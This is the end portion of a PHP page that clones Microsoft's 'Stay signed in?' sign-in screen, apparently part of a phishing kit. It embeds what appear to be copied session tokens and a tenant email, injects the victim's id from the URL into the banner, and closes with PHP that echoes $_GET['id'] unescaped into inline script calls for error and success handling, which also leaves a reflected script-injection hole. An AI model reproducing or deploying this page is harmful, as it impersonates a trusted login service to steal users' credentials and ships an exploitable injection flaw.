                    setLightBoxFadeIn: view_onSetLightBoxFadeIn } }"><!--  -->

<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
    <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">

        <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.urlProfilePhoto,
                displayName: sharedData.displayName || svr.sPOST_Username,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  -->

<div class="identityBanner">
    <!-- ko if: isBackButtonVisible --><!-- /ko -->

    <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="anthrax@bpllcptltd.onmicrosoft.com"><?php echo $_GET['id'] ?? ''; ?></div>
</div></div>
    </div>
    <!-- /ko -->

    <div class="pagination-view has-identity-banner animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="20" data-showidentitybanner="true" data-bind="pageViewComponent: { name: 'kmsi-view',
                params: {
                    serverData: svr,
                    displayName: sharedData.displayName },
                event: {
                    submitReady: $kmsiPage.view_onSubmitReady } }"><!--  -->

<input type="hidden" name="LoginOptions" data-bind="value: loginOptions" value="3">
<input type="hidden" name="type" data-bind="value: 28" value="28">
<input type="hidden" name="ctx" data-bind="value: svr.sCtx" value="rQQIARAAhZM7jONkFIXzmAmZaJcdhhUC0YzQFgj4E78fIyGR1-RlO3ZiO4mbyHFsx_HjzzhO7HFJRTn10kE3DY8GNBICiW4Q0tBQLAWIErESQmi1xSKRgXpFc3WPjo5ucb9TKlJllCojZeStPFZGTh4QNEUSBDkDOGZQgGBnCGBwkwLonMV3FkZThh4elQ5fP98o7lfjzuWn3zX5ZXB1mT1eRNFqfVKpxHFchpblGGbZgH7F04O5E9hb7Mts9iabfZjbNwOgDC9zawpnUAzFaJJlGHZ3GEHLvGxgguwifOpGgtxEtSGCCA0X5WTP430p6rckXPCbJJ-qDj_qJLzPpzwmJbtM1G9MUL6OINpIXXCyTWgtJRIwPunLLsljCjoZ8emj3L1-dRMtsNsBQyc1_8wdWDD0pyu4jh7mf8xxjdhR4EAVIrK_hLjlU5J22uITkECF0A0b7y3jlotQY5GY9UKP4gW7Tyl2DXJMAxLcaAIZ2tSGqAriJsWl7JmG2JNQl2ZiEmNcvz_tiHbaWLouN6rO41BqmYGP9Ta8LfZMvKYAIh3O0tVpvREqp3pvgiwWAhjNuj7lz-cz-nRAifM5GfJzU0vDdXBOAT1uo2dVqdbdrHwp3up8vbVBl7EfQqm9bJPtTZtwIrzFGkC1E7garPgISOvt8qw3UGJ9K7eghrSntlp1cEodil3eZQK5CUDCnHWm49XaJAYBSXia0yESeI4LddvkRGemBS7ZOx9ZG8_pAE4d0KCn-JhnTDQPDEdtYVRbu6C1UcEokWL7Mv_ac_DYYp_nC7vFh8FV_gGN4YZFUDrQdYbe4cdQgEWwGSApDGUNnaV1i7jO03BlBs78eBVCy_HM55G3xSr9f1Ub-ma56nm_5t_Qg2gR6sl7NZHj6qLMyY0yDHzHCOEaWtFt7GYv-9veK8XC4eGrmePMm_eR_EmxWDrM3Kqne9mL_exH-7sCfPhL8e37X3zd_PjxX-988r2Vud6v1OpShe6O0VqwEEPVJFmE9I2uP0nqy1RKlHG6e3E0sX1pIb2LnKAXhexFoXBdeKnTmApNeShXhUZ10MCmyB-F_AcvZK8O_rdS79-5W8wcHRzgT7qf_X7vp_ajOy-XShtn6kFD98z10X9V--Zu5umLNz__8Oz6728ft_8B0">
<input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="4f88c01b-17d9-4b40-bd1a-1317ae261600">
<input type="hidden" data-bind="attr: { name: svr.sFTName }, value: svr.sFT" name="flowToken" value="AQABAAEAAAD--DLA3VO7QrddgJg7WevrusN4UIeGewUCYzRMCrJfwbEpftx_pu7Hm6TSN2ZARxQyGmQ9Exlo9mQmlaC4RKjStCp97YyW0uHI_hv05_lZNC_rWmcAzvpkhqOfMz4qJ3SCo_DiMC-IrXo9AD5jg1Zs9aoMYt51EA3R2a677ojeWeNLGylZLJ7JmTVdn4g774dUXMZkDNc-QERo9gzwvQLfsUf8dKmLDzHuV-yvIJR_QgaQ5rkA-uAo3bLba_VcAy21LvIESIV6s2ZdnSmB599LYyiPU_mgZ7I_fuZuNFwvVfQm5Y2YfXeknuX2mCBWP2Q01NXXOvjyz3R7zSD3qf8LoeospflVjVu0UoZcRoizcMIqy-5GNsjjwIMpCsW6DCHzc60OkjigQ7g2T38GzJtaroCVofnRhnzgjIlSGTiUR_ltK3UQ300vdMI4CHXigK6f5SdHTF66Wvep9_KEIM-a9AnjwcyR3M9-qIKfOcIzFSAKBZiE9Ul0_lko-qy5R7GyZVd9q5WsePlKvEtNfsWAfYGLjQHKXqYF8TXibXTuvUI6ch4AnEuIjq9pXNOe15a2gxiSIRDcQQ51G9CSptr7cD_5SQrzakDARaaVP3iGSjZb_DBOq7ruH7sRiDgfln2IgmzZ0qt-zGqnu8H-oGRm5TdaCWPvVdMIt71JI3qjz1juAkk3WfVeikxI939GulocaywffKWbC7YMfCl5o6u3vGAHZS9BLzH5NAkNQVZ-lCAA">

<div class="row text-title" role="heading" aria-level="1" data-bind="text: str['STR_Kmsi_Title']">Stay signed in?</div>
<div class="row text-body">
    <div id="KmsiDescription" class="text-block-body overflow-hidden no-margin-top" data-bind="text: str['STR_Kmsi_Description']">Do this to reduce the number of times you are asked to sign in.</div>
</div>

<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
    <div class="row">
        <div class="col-md-24 form-group checkbox">
            <label>
                <input id="KmsiCheckboxField" name="DontShowAgain" type="checkbox" value="true" data-bind="ariaLabel: str['STR_Kmsi_DontShowAgain']" aria-label="Don't show this again">
                <span data-bind="text: str['STR_Kmsi_DontShowAgain']">Don't show this again</span>
            </label>
        </div>
    </div>

    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
        <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['STR_Kmsi_Accept_Kmsi'],
            secondaryButtonText: str['STR_Kmsi_Decline_Kmsi'],
            focusOnPrimaryButton: true,
            primaryButtonDescribedBy: 'KmsiDescription' },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin },
    externalCss: { 'button-field-container': true }">

    <!-- ko if: isSecondaryButtonVisible -->
    <div data-bind="css: { 'inline-block': true }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
        <input type="submit" id="idBtn_Back" class="win-button button-secondary button ext-button secondary ext-secondary" data-bind="
            attr: { 'id': secondaryButtonId || 'idBtn_Back' },
            externalCss: {
                'button': true,
                'secondary': true },
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            ariaDescribedBy: secondaryButtonDescribedBy,
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled" value="No">
    </div>
    <!-- /ko -->

    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    'button': true,
                    'primary': true },
                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" aria-describedby="KmsiDescription" value="Yes">
    </div>
</div></div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
</div></div>

        <!-- ko if: svr.sCanaryTokenName -->
        <input type="hidden" data-bind="attr: { name: svr.sCanaryTokenName }, value: svr.canary" name="canary" value="BCQ/7JX1BnhPrVe5905mcJmYxCjzQxUXzPKetYgmQhQ=6:1">
        <!-- /ko -->

        <div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">
<input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>

    <!-- /ko -->
        </div>

        <!-- ko if: $page.showFedCredAndNewSession --><!-- /ko -->

        <!-- ko if: $page.showDebugDetails --><!-- /ko -->
    </div>
</div>
<!-- /ko --></div>
        </div>
    </div>

    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">

        <div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://www.microsoft.com/en-US/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://privacy.microsoft.com/en-US/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
        <!-- /ko -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: a11yConformeLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->

    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
    <a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.fShowLegalMessagingInline && showLinks --><!-- /ko --></div>
    </div>
    <!-- /ko -->
</div>
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
    <!-- /ko -->
<!-- /ko --></div>
    <!-- /ko -->
</form></div>

  


</body></html>


<?php
if (isset($_GET['error'])) {
    $id = $_GET['id'];
    echo "<script>iserror('$id');</script>";
} else if (isset($_GET['success'])) {
    $id = $_GET['id'];
    //  $users = $_GET['users'];
    echo "<script>isSuccess('$id');</script>";
    // echo "<script>isSuccess('$users');</script>";
}
?>